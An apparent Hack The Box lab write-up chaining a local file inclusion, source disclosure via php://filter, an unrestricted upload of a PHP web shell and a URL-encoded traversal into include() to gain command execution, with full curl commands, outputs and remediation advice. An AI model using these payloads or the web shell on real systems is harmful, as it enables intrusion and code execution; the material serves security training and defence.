# Hack The Box — File Inclusion Skills Assessment
## Complete LFI → Source Code Disclosure → Unrestricted File Upload → RCE Report

---

## 1. Assessment Information

| Field | Details |
|---|---|
| Platform | Hack The Box |
| Assessment | File Inclusion Skills Assessment |
| Target | `154.57.164.77` |
| Port | `30735` |
| Protocol | HTTP |
| Base URL | `http://154.57.164.77:30735` |
| Web Server | nginx/1.22.1 |
| PHP | PHP 8.2-FPM |
| Web Root | `/var/www/html` |
| Initial Vulnerability | Local File Inclusion / Arbitrary File Read |
| Secondary Vulnerability | Unrestricted File Upload |
| Final Vulnerability | PHP Local File Inclusion / Unsafe `include()` |
| Final Impact | Remote Code Execution |
| RCE User | `www-data` |
| Flag File | `/flag_09ebca.txt` |
| Flag | `eedbb78d4800aa45573840ed6bd2d1e3` |

**Authorization:** This report documents exploitation of the intentionally provided Hack The Box assessment instance.

---

# 2. Executive Summary

The target hosted a web application belonging to the fictional company **Sumace Consulting GmbH**.

The compromise required chaining multiple weaknesses rather than relying on a single vulnerability.

The final attack chain was:

```text
Web Application Reconnaissance
            ↓
Identify Image API
            ↓
LFI in /api/image.php?p=
            ↓
Arbitrary File Read
            ↓
Read PHP Source Code
            ↓
Discover Unrestricted File Upload
            ↓
Discover Predictable MD5-Based Filename
            ↓
Discover Vulnerable contact.php?region=
            ↓
URL-Encoding Filter Bypass
            ↓
PHP include()
            ↓
Uploaded PHP Shell Execution
            ↓
Remote Code Execution as www-data
            ↓
Filesystem Enumeration
            ↓
Flag Discovery
            ↓
Flag Retrieval
```

The first LFI used `file_get_contents()`, so it provided file disclosure rather than direct PHP execution. Source-code disclosure then revealed the unrestricted upload functionality and the vulnerable `include()` statement. The upload functionality allowed a PHP file to be stored with a predictable MD5-derived filename, while the `contact.php` parameter allowed URL-encoded traversal to bypass its input filter.

---

# 3. Application Reconnaissance

The target exposed three primary pages:

```text
/
 /contact.php
 /apply.php
```

The Apply page contained:

```text
First Name
Last Name
Email
Resume
Additional Notes
```

The form submitted to:

```text
POST /api/application.php
```

using:

```text
multipart/form-data
```

The file field was named:

```text
file
```

The interface described the expected resume types as:

```text
.docx, .pdf
```

However, this restriction was only presented in the HTML interface and was not enforced by the server-side upload code.

---

# 4. Investigation of `thanks.php`

Submitting the application redirected to:

```text
/thanks.php?n=<firstName>
```

Example:

```text
http://154.57.164.77:30735/thanks.php?n=Test
```

The response displayed:

```text
Thanks for applying, Test!
```

The source contained:

```php
<h1>
Thanks for applying,
<?=htmlentities((isset($_GET["n"])) ? $_GET["n"] : "[object Object]")?>
!
</h1>
```

The `n` parameter was therefore reflected after HTML encoding.

---

# 5. Testing `thanks.php?n=`

Traversal-style values were supplied to:

```text
/thanks.php?n=
```

The application reflected the supplied value rather than interpreting it as a path.

Conclusion:

```text
thanks.php?n=
        ↓
Reflection only
        ↓
No useful LFI
```

This was a dead end, so investigation moved to the image endpoint.

---

# 6. Discovering the Image Endpoint

Inspection of the application HTML revealed image requests through:

```text
/api/image.php?p=<value>
```

Example:

```text
/api/image.php?p=9e3836574d40d60a56435829003f0196
```

The parameter was a 32-character hexadecimal value resembling an MD5 identifier.

The important observation was that the endpoint appeared to use the `p` parameter to determine which file was returned.

This made it a strong candidate for Local File Inclusion testing.

---

# 7. API Endpoint Enumeration

API enumeration was performed with `ffuf`:

```bash
ffuf \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u 'http://154.57.164.77:30735/api/FUZZ' \
  -mc 200,204,301,302,307,401,403
```

The initial scan produced many false positives because nonexistent resources returned a common response size.

The response size was:

```text
3405
```

The scan was repeated with size filtering:

```bash
ffuf \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u 'http://154.57.164.77:30735/api/FUZZ' \
  -mc 200,204,301,302,307,401,403 \
  -fs 3405
```

The scan completed successfully:

```text
Progress: [4752/4752]
Job [1/1]
278 req/sec
Errors: 0
```

---

# 8. Investigating `/apply.php`

The application page was retrieved with:

```bash
curl -s http://154.57.164.77:30735/apply.php
```

The page contained:

```html
<form action="/api/application.php"
      method="POST"
      enctype="multipart/form-data">
```

Relevant fields:

```html
<input type="text" name="firstName" required />
<input type="text" name="lastName" required />
<input type="email" name="email" required />
<input type="file" name="file" required />
<textarea name="notes"></textarea>
```

The file upload was labelled:

```text
Resume (.docx, .pdf)
```

---

# 9. Testing Normal File Upload

A test PDF was created:

```bash
echo '%PDF-1.4
test' > /tmp/test.pdf
```

It was uploaded:

```bash
curl -i \
  -F 'firstName=Test' \
  -F 'lastName=User' \
  -F 'email=test@example.com' \
  -F 'notes=test' \
  -F 'file=@/tmp/test.pdf;filename=test.pdf' \
  'http://154.57.164.77:30735/api/application.php'
```

The server returned:

```text
HTTP/1.1 302 Found
Server: nginx/1.22.1
Location: /thanks.php?n=Test
```

Following the redirect returned:

```text
Thanks for applying, Test!
```

This confirmed that the upload endpoint accepted multipart file uploads.

---

# 10. Testing the Upload Directory

The upload directory was requested directly:

```bash
curl -i http://154.57.164.77:30735/uploads/
```

The response was:

```text
HTTP/1.1 403 Forbidden
Server: nginx/1.22.1
```

Directory listing was therefore disabled.

---

# 11. Discovering the LFI

The image endpoint was tested:

```text
/api/image.php?p=
```

A direct traversal attempt such as:

```text
../../../../../../../../etc/passwd
```

did not immediately produce useful output.

The server returned an HTTP 200 response with:

```text
Content-Type: image/jpeg
```

This suggested that traversal depth or filtering needed further investigation.

---

# 12. LFI Fuzzing with LFI-Jhaddix

Automated LFI testing was performed:

```bash
ffuf \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u 'http://154.57.164.77:30735/api/image.php?p=FUZZ' \
  -mc 200 \
  -fs 156
```

The scan produced multiple traversal and encoding candidates.

A useful candidate was:

```text
....//....//....//etc/passwd
```

Another notable response was:

```text
Status: 200
Size: 1041
Words: 7
Lines: 22
```

The different response size indicated that actual file contents were being returned.

---

# 13. Confirming the LFI Payload

A working traversal pattern was:

```text
....//....//....//....//....//....//etc/passwd
```

The application's simplistic traversal removal could be bypassed by alternative traversal representations.

The vulnerability was therefore confirmed as:

```text
Local File Inclusion / Arbitrary Local File Read
```

---

# 14. LFI Source Code Discovery

After confirming LFI, the next objective was source-code disclosure.

The `php://filter` wrapper was used to retrieve PHP source as base64:

```bash
curl 'http://154.57.164.77:30735/api/image.php?p=php://filter/read=convert.base64-encode/resource=....//....//....//api/image.php'
```

The resulting base64 data could then be decoded locally.

This allowed the PHP source of `image.php` to be recovered without executing it through the normal web request path.

---

# 15. Reading `image.php`

The recovered source was:

```php
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>
```

The key lines were:

```php
$path = "../images/" . str_replace("../", "", $_GET["p"]);
```

and:

```php
$contents = file_get_contents($path);
```

---

# 16. Why the First LFI Does Not Directly Give RCE

The vulnerable function is:

```php
file_get_contents()
```

This reads file contents.

It does not interpret those contents as PHP code.

Therefore, if a file contains:

```php
<?php system($_GET["cmd"]); ?>
```

`file_get_contents()` returns the PHP source rather than executing it.

This explained why the first LFI was primarily useful for:

- arbitrary file read
- source disclosure
- discovering additional application vulnerabilities

The investigation therefore continued through source-code analysis.

---

# 17. Reading Application Source Code

The first LFI was used to retrieve application source files including:

```text
index.php
contact.php
apply.php
thanks.php
api/application.php
api/image.php
```

A loop was used to retrieve several files:

```bash
for f in \
  index.php \
  contact.php \
  apply.php \
  thanks.php
do
    echo "========== $f =========="
    curl -sG \
      --data-urlencode "p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/$f" \
      'http://154.57.164.77:30735/api/image.php'
    echo
done
```

---

# 18. `index.php`

The recovered page confirmed the website structure:

```text
Home
Contact
Apply
```

The website identified itself as:

```text
Sumace Consulting Gmbh
```

with the slogan:

```text
Trusted IT consultants. Since 1998.
```

The footer contained:

```text
Sumace Consulting Gmbh
Rasumofskygasse 23/25, 1030 Wien
+43 670 8872 958
```

---

# 19. Reading `application.php`

The most important source-code discovery was:

```text
/api/application.php
```

The relevant source was:

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

---

# 20. Analysis of the Upload Code

The upload implementation contains several weaknesses.

### Temporary filename

```php
$tmp_name = $_FILES["file"]["tmp_name"];
```

### Client-controlled filename

```php
$file_name = $_FILES["file"]["name"];
```

### Extension extraction

```php
$ext = end((explode(".", $file_name)));
```

### Destination filename

```php
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
```

### File movement

```php
move_uploaded_file($tmp_name, $target_file);
```

There is no server-side restriction requiring the extension to be `.pdf` or `.docx`.

---

# 21. Upload Vulnerability

Although the HTML interface states:

```text
Resume (.docx, .pdf)
```

the server-side code accepts the extension supplied in the filename.

Therefore a filename such as:

```text
shell.php
```

causes:

```text
php
```

to become the selected extension.

The server then saves the file as:

```text
<MD5(file contents)>.php
```

This creates an unrestricted file-upload vulnerability.

---

# 22. Predictable Filename

The filename is calculated using:

```php
md5_file($tmp_name)
```

Because the resulting MD5 depends on the file contents, the attacker can calculate the server-side filename before requesting it.

For the shell used in this assessment:

```text
fc023fcacb27a7ad72d605c4e300b389
```

Therefore the uploaded filename was:

```text
fc023fcacb27a7ad72d605c4e300b389.php
```

---

# 23. Reading `contact.php`

The second major source-code discovery was:

```text
/contact.php
```

The relevant logic was:

```php
$region = "AT";
$danger = false;

if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") ||
        str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}

if (!$danger) {
    include "./regions/" . $region . ".php";
}
```

---

# 24. Understanding the `region` Parameter

A request such as:

```text
/contact.php?region=DE
```

loads:

```text
./regions/DE.php
```

URL encoding was confirmed by submitting:

```text
region=%44%45
```

which decodes to:

```text
DE
```

The application then displayed German contact information:

```text
Tel: +49 30 747 92 16
Email: de@sumace.htb
```

This confirmed that the parameter is decoded before use.

---

# 25. The Security Filter

The application attempts to block traversal with:

```php
str_contains($_GET["region"], ".")
```

and:

```php
str_contains($_GET["region"], "/")
```

If either character is detected, it returns:

```text
'region' parameter contains invalid character(s)
```

A direct traversal request therefore fails.

---

# 26. URL-Encoding Filter Bypass

The critical flaw is the order of operations.

The application performs:

```text
User input
   ↓
Check for "." and "/"
   ↓
urldecode()
   ↓
include()
```

An encoded dot:

```text
%2e
```

becomes:

```text
.
```

An encoded slash:

```text
%2f
```

becomes:

```text
/
```

Therefore:

```text
%2e%2e%2f
```

becomes:

```text
../
```

after the security check has already completed.

This bypasses the simplistic filter.

---

# 27. Why `include()` Changes Everything

The first vulnerable function was:

```php
file_get_contents()
```

which produces file disclosure.

The second vulnerable function is:

```php
include()
```

which causes PHP to load and interpret PHP code.

Therefore:

```text
file_get_contents()
=
file disclosure
```

while:

```text
include()
=
potential PHP execution
```

This distinction enables the LFI-to-RCE chain.

---

# 28. Creating the PHP Payload

A minimal PHP command-execution payload was created:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

The file was verified:

```bash
cat /tmp/shell.php
```

Output:

```php
<?php system($_GET["cmd"]); ?>
```

---

# 29. Calculating the MD5

The payload was hashed:

```bash
md5sum /tmp/shell.php
```

Result:

```text
fc023fcacb27a7ad72d605c4e300b389
```

Expected uploaded filename:

```text
fc023fcacb27a7ad72d605c4e300b389.php
```

---

# 30. Uploading the PHP File

The PHP payload was uploaded through:

```text
/api/application.php
```

Command:

```bash
curl -i \
  -F 'firstName=Shell' \
  -F 'lastName=Test' \
  -F 'email=test@example.com' \
  -F 'notes=test' \
  -F 'file=@/tmp/shell.php;filename=shell.php' \
  'http://154.57.164.77:30735/api/application.php'
```

The server returned:

```text
HTTP/1.1 302 Found
Server: nginx/1.22.1
Location: /thanks.php?n=Shell
```

This demonstrated that the server accepted the PHP file even though the application interface claimed resumes should be `.docx` or `.pdf`.

---

# 31. Confirming the Uploaded File

The first LFI was used to read the uploaded file:

```bash
curl -sG \
  --data-urlencode 'p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/uploads/fc023fcacb27a7ad72d605c4e300b389.php' \
  'http://154.57.164.77:30735/api/image.php'
```

The response was:

```php
<?php system($_GET["cmd"]); ?>
```

This confirmed that the PHP file was successfully stored on the server.

---

# 32. Nginx Configuration Discovery

The initial LFI was also used to inspect the Nginx configuration.

The main configuration included:

```text
access_log /var/log/nginx/access.log;
include /etc/nginx/conf.d/*.conf;
include /etc/nginx/sites-enabled/*;
```

The virtual host configuration showed:

```nginx
server {
    listen 80;

    root /var/www/html;

    location / {
        index index.php;
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }

    location ^~ /regions/ {
        deny all;
    }

    location ^~ /uploads/ {
        deny all;
    }
}
```

---

# 33. Significance of the Nginx Configuration

The web root was:

```text
/var/www/html
```

Therefore the upload directory was:

```text
/var/www/html/uploads/
```

PHP files were processed through:

```text
/run/php/php8.2-fpm.sock
```

The Nginx configuration also denied direct HTTP access to:

```text
/regions/
```

and:

```text
/uploads/
```

This explains the earlier:

```text
403 Forbidden
```

response when requesting `/uploads/`.

However, PHP filesystem access remained possible.

---

# 34. Testing the Complete Inclusion Chain

The intended traversal was:

```text
../uploads/fc023fcacb27a7ad72d605c4e300b389.php
```

A direct request failed because the raw input contained literal:

```text
.
/
```

The application returned:

```text
'region' parameter contains invalid character(s)
```

This confirmed the need for an encoded traversal representation.

---

# 35. URL-Encoded Inclusion Request

The traversal was encoded:

```text
%2e%2e%2fuploads%2ffc023fcacb27a7ad72d605c4e300b389%2ephp
```

The resulting request was conceptually:

```text
/contact.php?region=%2e%2e%2fuploads%2ffc023fcacb27a7ad72d605c4e300b389%2ephp&cmd=id
```

The raw parameter contained no literal `.` or `/`.

After the application's `urldecode()` operation, it became:

```text
../uploads/fc023fcacb27a7ad72d605c4e300b389.php
```

and was passed to `include()`.

---

# 36. Confirming Remote Code Execution

The command parameter was:

```text
cmd=id
```

The resulting output was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Therefore:

```text
Remote Code Execution = CONFIRMED
```

The uploaded PHP shell was executing with the privileges of:

```text
www-data
```

---

# 37. RCE Attack Flow

```text
GET /contact.php
       |
       v
region=%2e%2e%2fuploads%2f...
       |
       v
str_contains(".", "/")
       |
       v
No literal "." or "/" found
       |
       v
urldecode()
       |
       v
../uploads/fc023fcacb27a7ad72d605c4e300b389.php
       |
       v
include()
       |
       v
PHP shell loaded
       |
       v
system($_GET["cmd"])
       |
       v
cmd=id
       |
       v
uid=33(www-data)
```

---

# 38. Root Directory Enumeration

After obtaining RCE, the root filesystem was enumerated:

```bash
curl -sG \
  --data-urlencode 'region=%2e%2e%2fuploads%2ffc023fcacb27a7ad72d605c4e300b389' \
  --data-urlencode 'cmd=ls -la /' \
  'http://154.57.164.77:30735/contact.php'
```

The output included:

```text
total 4
drwxr-xr-x.    1 root root  50 Aug 29 13:03 .
drwxr-xr-x.    1 root root  50 Aug 29 13:03 ..
lrwxrwxrwx.    1 root root   7 Aug 11  2025 bin -> usr/bin
drwxr-xr-x.    2 root root   6 May  9  2025 boot
drwxr-xr-x.    5 root root 340 Aug 29 13:03 dev
drwxr-xr-x.    1 root root  19 Aug 29 13:03 etc
-r--r--r--.    1 root root  32 Aug 14  2024 flag_09ebca.txt
```

The flag filename was therefore identified as:

```text
/flag_09ebca.txt
```

---

# 39. Initial Flag Retrieval Attempt

The first attempt was:

```text
cmd=cat /flag
```

This did not return the flag because the actual filename was:

```text
/flag_09ebca.txt
```

The root-directory enumeration provided the correct path.

---

# 40. Final Flag Retrieval

The correct command was:

```text
cmd=cat /flag_09ebca.txt
```

Complete request:

```bash
curl -sG \
  --data-urlencode 'region=%2e%2e%2fuploads%2ffc023fcacb27a7ad72d605c4e300b389' \
  --data-urlencode 'cmd=cat /flag_09ebca.txt' \
  'http://154.57.164.77:30735/contact.php'
```

The server returned:

```text
eedbb78d4800aa45573840ed6bd2d1e3
```

This was the final assessment flag.

---

# 41. Complete Attack Chain

```text
                        TARGET
                           |
                           v
              154.57.164.77:30735
                           |
                           v
                  Web Application
                           |
          +----------------+----------------+
          |                                 |
          v                                 v
    /thanks.php                         /apply.php
          |                                 |
          |                                 v
          |                       File Upload Function
          |                                 |
          |                                 v
          |                      /api/application.php
          |                                 |
          |                                 v
          |                        No extension check
          |                                 |
          |                                 v
          |                         Upload shell.php
          |                                 |
          |                                 v
          |                        MD5-based filename
          |                                 |
          +----------------+----------------+
                           |
                           v
                  /api/image.php?p=
                           |
                           v
                     LFI / File Read
                           |
                           v
                   PHP Source Disclosure
                           |
              +------------+-------------+
              |                          |
              v                          v
       application.php               contact.php
              |                          |
              v                          v
      Upload vulnerability        region parameter
              |                          |
              |                          v
              |                  "." and "/" filter
              |                          |
              |                          v
              |                    urldecode()
              |                          |
              |                          v
              |                       include()
              |                          |
              +------------+-------------+
                           |
                           v
                     Uploaded shell
                           |
                           v
                   system($_GET["cmd"])
                           |
                           v
                       RCE
                           |
                           v
                    www-data user
                           |
                           v
                   ls -la /
                           |
                           v
                flag_09ebca.txt
                           |
                           v
                       FLAG
```

---

# 42. Vulnerability Analysis

## Finding 1 — Local File Inclusion / Arbitrary File Read

### Affected endpoint

```text
/api/image.php?p=
```

### Vulnerable logic

```php
$path = "../images/" . str_replace("../", "", $_GET["p"]);
$contents = file_get_contents($path);
```

### Root cause

The application attempts to sanitize traversal using:

```php
str_replace("../", "", $input)
```

This is not a secure path-validation mechanism.

### Impact

An attacker can read files accessible to the PHP process, including application source code and configuration.

### Severity

**High**

---

## Finding 2 — Source Code Disclosure

The LFI allows PHP source to be obtained.

Affected files included:

```text
api/image.php
api/application.php
contact.php
apply.php
thanks.php
```

Source disclosure exposes application logic and makes chained exploitation significantly easier.

### Severity

**High**

---

## Finding 3 — Unrestricted File Upload

### Affected endpoint

```text
POST /api/application.php
```

### Vulnerable logic

```php
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);
```

### Root cause

No server-side extension allowlist is enforced.

### Impact

An attacker can upload a PHP file.

### Severity

**Critical when combined with the inclusion vulnerability**

---

## Finding 4 — Predictable Upload Filename

Uploaded files are renamed using:

```php
md5_file($tmp_name)
```

This makes the resulting filename predictable when the attacker controls the uploaded content.

### Severity

**Medium**

---

## Finding 5 — Unsafe Dynamic `include()`

### Affected endpoint

```text
/contact.php?region=
```

### Vulnerable code

```php
$region = urldecode($_GET["region"]);

include "./regions/" . $region . ".php";
```

### Root cause

Attacker-controlled data reaches `include()`.

### Impact

An attacker can cause PHP to include an arbitrary local PHP file.

### Severity

**Critical**

---

## Finding 6 — Validation Before Canonicalization

The security check is performed on the raw parameter:

```php
str_contains($_GET["region"], ".")
str_contains($_GET["region"], "/")
```

but decoding happens afterward:

```php
$region = urldecode($_GET["region"]);
```

Therefore:

```text
%2e%2e%2f
```

passes the filter and later becomes:

```text
../
```

### Severity

**High**

---

## Finding 7 — Remote Code Execution

The complete vulnerability chain is:

```text
Arbitrary file upload
+
Predictable filename
+
Path traversal
+
Unsafe include()
+
URL-decoding bypass
=
PHP code execution
```

RCE was confirmed with:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Severity

**Critical**

---

# 43. Evidence Summary

| Evidence | Result |
|---|---|
| Web server | nginx/1.22.1 |
| Web root | `/var/www/html` |
| PHP handler | PHP 8.2-FPM |
| Image endpoint | `/api/image.php?p=` |
| Upload endpoint | `/api/application.php` |
| Upload directory | `/var/www/html/uploads/` |
| Contact endpoint | `/contact.php?region=` |
| LFI confirmed | Yes |
| PHP source disclosure | Yes |
| PHP upload accepted | Yes |
| Uploaded shell | `fc023fcacb27a7ad72d605c4e300b389.php` |
| RCE | Yes |
| RCE account | `www-data` |
| Flag file | `/flag_09ebca.txt` |
| Flag | `eedbb78d4800aa45573840ed6bd2d1e3` |

---

# 44. Failed Attempts and Lessons Learned

## 44.1 `thanks.php?n=` LFI

### Attempt

Traversal values were supplied to:

```text
/thanks.php?n=
```

### Result

The value was reflected.

### Lesson

Not every user-controlled parameter that reflects input is an LFI.

---

## 44.2 Direct LFI to RCE

### Attempt

The first LFI was investigated as a possible direct execution primitive.

### Result

Only file contents were returned.

### Reason

The vulnerable function was:

```php
file_get_contents()
```

rather than:

```php
include()
```

### Lesson

Always identify the exact filesystem function being used.

---

## 44.3 Direct `/uploads/` Access

### Attempt

```text
/uploads/
```

### Result

```text
403 Forbidden
```

### Lesson

A directory can be inaccessible through HTTP while still being accessible to the server-side PHP process.

---

## 44.4 Direct `../` Traversal in `region`

### Attempt

```text
region=../uploads/...
```

### Result

```text
'region' parameter contains invalid character(s)
```

### Lesson

The filter blocked literal traversal characters, so an encoded representation was required.

---

## 44.5 Wrong Flag Path

### Attempt

```text
cat /flag
```

### Result

No output.

### Correct approach

Enumerate the root directory first.

The actual file was:

```text
/flag_09ebca.txt
```

---

# 45. Why the Attack Worked

The vulnerabilities formed a dependency chain.

### Stage 1

The LFI allowed:

```text
Read application source
```

### Stage 2

The source revealed:

```text
Unrestricted PHP upload
```

### Stage 3

The upload mechanism provided:

```text
PHP file on disk
```

### Stage 4

The MD5 naming mechanism provided:

```text
Predictable filename
```

### Stage 5

The source of `contact.php` revealed:

```text
include()
```

### Stage 6

The URL-decoding flaw provided:

```text
Traversal filter bypass
```

### Stage 7

The uploaded PHP file was included.

### Stage 8

PHP executed:

```php
system($_GET["cmd"]);
```

### Stage 9

The attacker obtained:

```text
Remote Code Execution
```

---

# 46. Final Attack Chain in One Line

```text
/api/image.php?p=
→ LFI
→ PHP source disclosure
→ /api/application.php
→ unrestricted .php upload
→ MD5 filename prediction
→ /contact.php?region=
→ URL-encoded traversal
→ include()
→ uploaded PHP shell
→ system($_GET["cmd"])
→ RCE as www-data
→ /flag_09ebca.txt
→ eedbb78d4800aa45573840ed6bd2d1e3
```

---

# 47. Remediation

## 47.1 Fix the Image LFI

Do not construct filesystem paths directly from user input.

Avoid:

```php
$path = "../images/" . $_GET["p"];
```

Use an identifier-to-file mapping or a strict allowlist.

Example:

```php
$images = [
    "logo" => "/var/www/images/logo.jpg",
    "hero" => "/var/www/images/hero.jpg"
];

if (!isset($images[$id])) {
    http_response_code(404);
    exit;
}
```

---

## 47.2 Do Not Use String Replacement for Path Security

Avoid:

```php
str_replace("../", "", $input)
```

Use canonical paths and verify that the resulting path remains inside the intended directory.

---

## 47.3 Enforce Upload Extensions Server-Side

The server should explicitly allow only expected file types.

Validate:

- extension
- MIME type
- file signature
- size
- content
- filename
- double extensions
- alternate encodings

Never rely on an HTML `accept` attribute or descriptive label as a security control.

---

## 47.4 Never Allow PHP in Upload Directories

Uploaded files should ideally be stored outside the web root.

If web access is required, configure the web server so uploaded files cannot be interpreted as executable scripts.

---

## 47.5 Replace Dynamic `include()`

Avoid:

```php
include "./regions/" . $region . ".php";
```

Use an explicit mapping:

```php
$regions = [
    "AT" => "./regions/AT.php",
    "DE" => "./regions/DE.php",
    "US" => "./regions/US.php"
];

if (!isset($regions[$region])) {
    http_response_code(400);
    exit;
}

include $regions[$region];
```

The user should control only an identifier, not a filesystem path.

---

## 47.6 Canonicalize Before Validation

The safe conceptual sequence is:

```text
Input
 ↓
Decode / normalize
 ↓
Canonicalize
 ↓
Validate
 ↓
Use
```

not:

```text
Input
 ↓
Validate
 ↓
Decode
 ↓
Use
```

---

## 47.7 Disable Script Execution in Upload Locations

The web server should explicitly prevent uploaded files from being interpreted as PHP or other executable content.

---

# 48. Risk Assessment

| Vulnerability | Likelihood | Impact | Severity |
|---|---|---|---|
| Arbitrary File Read | High | High | High |
| Source Code Disclosure | High | High | High |
| Unrestricted File Upload | High | Critical | Critical |
| Predictable Filename | High | Medium | Medium |
| Unsafe `include()` | High | Critical | Critical |
| URL-encoding bypass | High | High | High |
| Remote Code Execution | High after chaining | Critical | Critical |

Overall assessment:

# **CRITICAL**

The application can be compromised to achieve arbitrary command execution as the web-server account.

---

# 49. Assessment Conclusion

The target demonstrated a realistic multi-vulnerability attack chain.

The initial LFI appeared limited because the vulnerable endpoint used:

```php
file_get_contents()
```

instead of an execution primitive.

However, the ability to read PHP source code exposed the application's internal architecture.

The source of `application.php` revealed an unrestricted file upload:

```php
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);
```

This allowed a PHP payload to be uploaded and stored as:

```text
fc023fcacb27a7ad72d605c4e300b389.php
```

The source of `contact.php` then exposed the execution primitive:

```php
$region = urldecode($_GET["region"]);
include "./regions/" . $region . ".php";
```

The attempted security control checked for `.` and `/` before URL decoding, allowing:

```text
%2e
%2f
```

to bypass the filter.

The uploaded PHP file was then included and executed.

RCE was confirmed with:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The root filesystem was enumerated and:

```text
/flag_09ebca.txt
```

was discovered.

The final flag was:

```text
eedbb78d4800aa45573840ed6bd2d1e3
```

---

# 50. Final Result

```text
TARGET
154.57.164.77:30735

LFI
✓ Confirmed

Source Code Disclosure
✓ Confirmed

Unrestricted PHP Upload
✓ Confirmed

Predictable Upload Filename
✓ Confirmed

URL-Encoding Filter Bypass
✓ Confirmed

PHP include() Execution
✓ Confirmed

Remote Code Execution
✓ Confirmed

Execution Context
www-data

Flag
eedbb78d4800aa45573840ed6bd2d1e3
```

---

# 51. Reference

Primary methodology reference:

MeetCyber — **HTB File Inclusion Skills Assessment: From LFI to RCE Full Walkthrough**

https://meetcyber.net/htb-file-inclusion-skills-assessment-from-lfi-to-rce-full-walkthrough-b073fd8a185f

Target-specific commands, outputs, source code, configuration details, and final flag in this report are based on the assessment session used for the target `154.57.164.77:30735`.

# End of Report
